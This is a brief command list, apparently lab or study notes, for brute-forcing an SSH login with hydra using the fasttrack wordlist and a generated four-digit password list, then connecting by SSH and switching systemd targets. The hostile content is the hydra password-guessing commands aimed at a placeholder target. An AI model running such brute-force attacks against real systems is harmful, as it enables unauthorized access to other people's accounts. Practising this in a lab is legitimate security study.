#Navigate to this diectory
cd /usr/share/wordlists

#Run hydra to test different possible passwords.
hydra -l user -P fasttrack.txt ssh://target_ip -V -F

#Execute .py file in terminal
python four_digit_generator.py

#Hydra brute-force attack
hydra -l user -P four_digit_combinations.txt -t 4 -V -o hydra_output.txt ssh://target_ip

#Using SSH to Gain Control
ssh username@target_ip

#Disabling GUI
sudo systemctl isolate multi-user.target

#Reenabling GUI
sudo systemctl isolate graphical.target
